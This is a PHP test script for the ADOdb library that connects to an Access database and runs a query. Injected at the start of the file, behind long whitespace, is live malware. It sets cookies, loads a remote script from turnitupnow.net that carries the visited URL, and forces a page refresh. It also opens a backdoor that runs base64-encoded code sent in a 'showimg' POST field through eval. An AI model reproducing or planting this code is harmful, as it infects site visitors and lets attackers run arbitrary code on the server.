<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }


// BASIC ADO test

	include_once('../adodb.inc.php');

	$db = &ADONewConnection("ado_access");
	$db->debug=1;
	$access = 'd:\inetpub\wwwroot\php\NWIND.MDB';
	$myDSN =  'PROVIDER=Microsoft.Jet.OLEDB.4.0;'
		. 'DATA SOURCE=' . $access . ';';
		
	echo "<p>PHP ",PHP_VERSION,"</p>";
	
	$db->Connect($myDSN) || die('fail');
	
	print_r($db->ServerInfo());
	
	try {
	$rs = $db->Execute("select $db->sysTimeStamp,* from adoxyz where id>02xx");
	print_r($rs->fields);
	} catch(exception $e) {
	print_r($e);
	echo "<p> Date m/d/Y =",$db->UserDate($rs->fields[4],'m/d/Y');
	}
?>